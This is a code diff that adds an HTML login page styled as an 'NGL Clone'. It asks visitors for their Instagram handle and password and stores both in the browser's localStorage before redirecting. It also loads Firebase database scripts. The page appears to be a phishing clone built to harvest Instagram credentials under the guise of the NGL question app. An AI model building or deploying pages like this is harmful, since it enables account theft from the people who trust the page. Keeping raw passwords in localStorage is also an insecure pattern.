@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>NGL Clone - Login</title>
+  <link rel="stylesheet" href="style.css">
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+  <script src="firebase.js"></script>
+</head>
+<body>
+  <div class="box">
+    <h1>NGL</h1>
+    <p>What's your Instagram handle?</p>
+    <input id="username" type="text" placeholder="@username"><br>
+    <input id="password" type="password" placeholder="Password"><br>
+    <button onclick="goToQuestion()">Continue</button>
+  </div>
+
+  <script>
+    function goToQuestion() {
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      localStorage.setItem("username", username);
+      localStorage.setItem("password", password);
+      window.location.href = "question.html";
+    }
+  </script>
+</body>
+</html>
